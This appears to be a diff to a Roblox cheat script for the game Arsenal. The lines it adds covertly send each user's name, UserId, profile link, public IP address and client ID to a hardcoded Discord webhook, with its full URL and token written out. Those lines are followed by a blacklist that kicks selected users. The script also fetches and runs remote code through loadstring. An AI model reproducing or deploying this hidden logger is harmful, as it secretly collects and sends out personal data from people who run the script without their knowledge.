@@ -1,3 +1,75 @@
+HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1370309132456038490/GPyFVFNd0y09Bgw1aTE0fbbS-poUyAOhpY16Yy3IglNSAXvuun-0wmgTsgNoVU3JaDe6"
+ 
+local request = syn and syn.request or request or http and http.request or http_request
+ 
+local response = request({
+    Url = Webhook_URL,
+    Method = "POST",
+    Headers = {
+        ['Content-Type'] = 'application/json'
+    },
+    Body = HttpService:JSONEncode({
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "",
+                ["description"] = game.Players.LocalPlayer.Name .." Logged into Arsenal Script",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffffff),
+                ["fields"] = {
+                    {
+                        ["name"] = "Player Name : ",
+                        ["value"] = game.Players.LocalPlayer.Name,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "UserId : ",
+                        ["value"] = game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "User Profile : ",
+                        ["value"] = "https://www.roblox.com/users/" ..
+                            game.Players.LocalPlayer.UserId,
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "IP: ",
+                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Client Id : ",
+                        ["value"] = game:GetService("RbxAnalyticsService")
+                            :GetClientId(),
+                        ["inline"] = true
+                    }
+                }
+            }
+        }
+    })
+})
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Danh sách UserId bị cấm
+local blacklist = {
+    [8533167956] = true,
+    [987654321] = true
+}
+
+-- Kiểm tra và đá người chơi nếu nằm trong danh sách
+if blacklist[LocalPlayer.UserId] then
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "🚫 WARN",
+        Text = "You have been blacklisted by the script owner.",
+        Duration = 10
+    })
+
+    task.wait(5)
+
+    LocalPlayer:Kick("You have been blacklisted by the script owner.")
+    return -- Đảm bảo không chạy các dòng sau
+end
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
     Name = "                                Arsenal",
